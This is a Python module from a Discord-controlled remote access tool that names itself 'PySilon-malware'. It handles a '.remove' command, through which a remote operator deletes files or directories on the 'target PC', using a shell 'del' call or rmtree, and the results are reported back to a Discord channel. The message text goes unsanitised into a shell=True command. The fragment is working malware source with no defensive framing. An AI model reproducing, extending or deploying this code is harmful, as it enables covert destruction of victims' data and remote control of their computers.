import os
from shutil import copy2, rmtree
from resources.misc import *
import subprocess
# end of imports

# on message
elif message.content[:7] == '.remove':
    await message.delete()
    if message.channel.id == channel_ids['file']:
        if message.content.strip() == '.remove':
            embed = discord.Embed(title="📛 Error",description=f'```Syntax: .remove <file-or-directory>```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
            
            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
        else:
            if os.path.exists('/'.join(working_directory) + '/' + message.content[8:]):
                try:
                    if os.path.isfile('/'.join(working_directory) + '/' + message.content[8:]):
                        subprocess.run('del "' + '\\'.join(working_directory) + '\\' + message.content[8:] + '"', shell=True)
                    else:
                        rmtree('/'.join(working_directory) + '/' + message.content[8:])
                    embed = discord.Embed(title="🟢 Success",description=f'```Successfully removed  ' + '/'.join(working_directory) + '/' + message.content[8:] + '  from target PC```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
                    
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                except Exception as error:
                    embed = discord.Embed(title="📛 Error",description=f'`' + str(error) + '`', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
                    
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            else:
                embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
                
                reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
    else:
        embed = discord.Embed(title="📛 Error",description=f'||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
        
        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
